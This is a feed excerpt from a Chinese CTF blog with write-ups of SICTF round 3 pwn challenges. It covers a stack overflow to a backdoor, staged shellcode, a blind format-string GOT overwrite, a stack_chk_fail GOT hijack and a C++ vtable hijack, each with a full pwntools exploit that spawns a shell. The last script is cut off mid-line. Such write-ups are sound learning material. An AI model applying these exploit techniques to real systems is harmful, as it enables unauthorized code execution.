class="token punctuation">)</span>LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.z1r0.top/2021/10/21/%E5%86%85%E6%A0%B8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/#/">https://www.z1r0.top/2021/10/21/%E5%86%85%E6%A0%B8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/#/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/#/">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/#/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下配置kernel环境过程中遇到的一些问题&lt;/p&gt;
&lt;h2 id=&quot;内核&quot;&gt;&lt;a href=&quot;#内核&quot; class=&quot;headerlink&quot; title=&quot;内核&quot;&gt;&lt;/a&gt;内核&lt;/h2&gt;&lt;h3 id=&quot;内核下载&quot;&gt;&lt;a href=&quot;#内核下载&quot; class=&quot;head</summary>
      
    
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/categories/kernel/"/>
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>SICTF-round3-2024-pwn</title>
    <link href="https://starrysky1004.github.io/2024/02/27/sictf-round3-2024-pwn/"/>
    <id>https://starrysky1004.github.io/2024/02/27/sictf-round3-2024-pwn/</id>
    <published>2024-02-27T11:59:04.000Z</published>
    <updated>2024-07-14T00:28:05.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p><code>run</code>函数<code>return</code>了<code>strdup(buf)</code>，也就是将输入的内容直接返回了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me the length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">0x40u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me your command: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strdup</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在后门函数，但是不能直接控制程序流到这个程序，因为只有当输入内容是<code>give me flag</code>才能执行<code>system</code>，但是执行的内容却是<code>give me flag</code>，所以直接控制程序到执行<code>system</code>的地址，并且参数就是之前输入的内容，在输出的时候<code>/bin/sh</code>后面需要用<code>\x00</code>截断</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"give me flag"</span><span class="token punctuation">,</span> <span class="token number">0xCuLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nope!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You got!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'yuanshen.life'</span><span class="token punctuation">,</span> <span class="token number">33057</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011F4</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Give me the length: '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x50</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Give me your command: '</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug_Zapper"></a>Bug_Zapper</h2><p>限制了读的长度小于等于<code>0x10</code>，可以先写<code>shellcode</code>执行<code>read</code>再次读，改<code>rdx</code>来读入更长的<code>shellcode</code>，最后读入<code>pwntools</code>直接生成的<code>shellcode</code>来<code>getshell</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1919810</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>    __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_creat <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov     esi, eaxxor     eax, eaxxor     edi, edimov     edx, esisyscall '''</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x89\xc6\x31\xc0\x31\xff\x89\xf2\x0f\x05'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'you'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0xa</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-SI"><a href="#Easy-SI" class="headerlink" title="Easy_SI"></a>Easy_SI</h2><p>盲打格式化字符串，先随便输出一段地址得到一些基本信息：</p><ul><li><p>栈中必定存在一个地址是<code>__libc_start_main - 128</code>，已知<code>libc</code>版本，将几个<code>libc</code>地址都减去<code>__libc_start_main + 128</code>，得到<code>libc</code>地址</p></li><li><p>几次输出的程序段地址都相同说明没有开<code>pie</code></p></li></ul><p>最终思路大概就是改<code>printf_got</code>为<code>ogg</code>了，随便改几个地址会发现可写段从<code>0x404000</code>开始，<code>got</code>基本也就在这一段，从<code>0x404000</code>向后<code>0x8</code>的尝试，改为<code>ogg</code>，最终确定<code>printf_got</code>在<code>0x404030</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'yuanshen.life'</span><span class="token punctuation">,</span> <span class="token number">34046</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'the game!!!'</span><span class="token punctuation">,</span> <span class="token string">b'%49$p'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>  <span class="token operator">-</span> <span class="token number">128</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseprintf_got <span class="token operator">=</span> <span class="token number">0x404030</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>printf_got<span class="token punctuation">:</span>system<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>检查保护，没有开<code>pie</code>和<code>canary</code>且可以溢出，且有<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  bugzapper_pro_release  checksec pwn            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn'</span>    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用点就在<code>std::string::operator</code></p><pre class="line-numbers language-none"><code class="language-none">0x40130f    mov    rsi, qword ptr [rbp - 0x60]0x401313    mov    rdi, qword ptr [rbp - 0x58]0x401317    call   std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator&#x3D;(char const*)@plt &lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator&#x3D;(char const*)@plt&gt;rdi: 0x7ffedb22ccd8 —▸ 0x404018 (__stack_chk_fail@got.plt) —▸ 0x401066 (__stack_chk_fail@plt+6) ◂— push 3rsi: 0x7ffedb22cc30 —▸ 0x4011d0 ◂— push rbprcx: 0x86c29a6f4f550100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入之后将<code>rbp - 0x60</code>里的值作为二参，<code>rbp - 0x58</code>里的值作为一参，而<code>rbp - 0x60</code>里的地址就是输入的起始地址，<code>rbp - 0x58</code>里的地址也是可以通过溢出覆盖到的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> x<span class="token operator">/</span><span class="token number">20</span>gx <span class="token number">0x7ffc18381560</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token number">0x7ffc18381500</span><span class="token operator">:</span> <span class="token number">0x00007ffc18381510</span>      <span class="token number">0x00007ffc183815b8</span><span class="token number">0x7ffc18381510</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381520</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381530</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381540</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381550</span><span class="token operator">:</span> <span class="token number">0x00000000004011d0</span>      <span class="token number">0x00000000004011d0</span><span class="token number">0x7ffc18381560</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381570</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381580</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span class="token number">0x7ffc18381590</span><span class="token operator">:</span> <span class="token number">0x6262626262626262</span>      <span class="token number">0x6262626262626262</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中存在如下一条指令，此时的<code>cl</code>就是<code>rsi</code>，所以控制<code>rdi</code>为<code>stack_chk_got</code>、<code>rsi</code>为<code>backdoor</code>再覆盖掉<code>canary</code>触发<code>stack_chk_fail</code>执行<code>backdoor</code></p><pre class="line-numbers language-none"><code class="language-none">0x7ff7587a0812 &lt;__memmove_avx_unaligned_erms+82&gt;    mov    byte ptr [rdi], cl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011D0</span>stack_chk_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_chk_got<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy_Cpp"></a>Eeeeasy_Cpp</h2><p>一个<code>c++</code>程序，程序一开始会给出一个程序中的地址，存在两个堆，其中一个堆用来存储输入的<code>name</code>和<code>password</code>，其中<code>password</code>可以向下溢出，而下面一个堆存储了用于输出的函数的<code>vtable</code>地址和要输出的地址，控制这两个地址就可以控制调用<code>show</code>时执行的函数和输出内容的地址（用于泄露）</p><blockquote><p><code>C++</code>中的虚函数表（<code>vtable</code>）是一种用于实现动态多态性的机制。它是在包含虚函数的类的对象中存储的一张表，用于存储该类的虚函数的地址。虚函数表使得在运行时可以通过指针或引用来访问实际派生类的虚函数。</p></blockquote><p>本题的思路就是通过改<code>vtable</code>位置的内容为一个存储<code>backdoor</code>的地址，这里需要向堆中写入<code>backdoor</code>地址，再将<code>vtable</code>处地址改成写入了<code>backdoor</code>的堆地址，所以还需要先泄露堆地址。</p><p>由于控制输出地址的那个位置就是一个堆地址，所以泄露堆地址可以直接改输出的地址的低位指向其本身，但是在泄露地址之后再次添加会向第二个堆输入，所以还需要再次<code>add</code>复原输出的堆地址低位，这样再次输入就能正常向第一个堆输入了。</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'G'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter your name: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter your password:'</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'P'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token 